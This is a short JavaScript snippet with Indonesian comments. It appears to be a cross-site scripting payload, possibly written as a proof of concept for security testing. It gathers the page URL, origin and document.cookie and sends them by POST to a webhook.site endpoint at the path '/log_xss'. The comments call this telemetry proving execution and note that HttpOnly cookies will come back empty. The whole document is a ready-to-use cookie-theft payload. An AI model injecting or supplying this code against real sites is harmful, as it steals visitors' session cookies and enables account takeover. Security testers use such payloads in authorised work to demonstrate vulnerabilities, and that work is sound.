(function() {
    var dataLog = {
        url: window.location.href,
        cookie: document.cookie, // Akan kosong jika dilindungi HttpOnly
        origin: window.origin
    };

    // Mengirimkan data telemetri ke webhook sebagai bukti eksekusi sukses
    fetch("https://332ac5ad-f1a7-4d1a-a5d5-c59c96b9c6e8.webhook.site/log_xss", {
        method: "POST",
        mode: "cors",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(dataLog)
    }).then(response => {
        console.log("Bukti eksekusi telah dikirim ke Webhook.");
    }).catch(err => {
        console.error("Gagal mengirim log:", err);
    });
})();
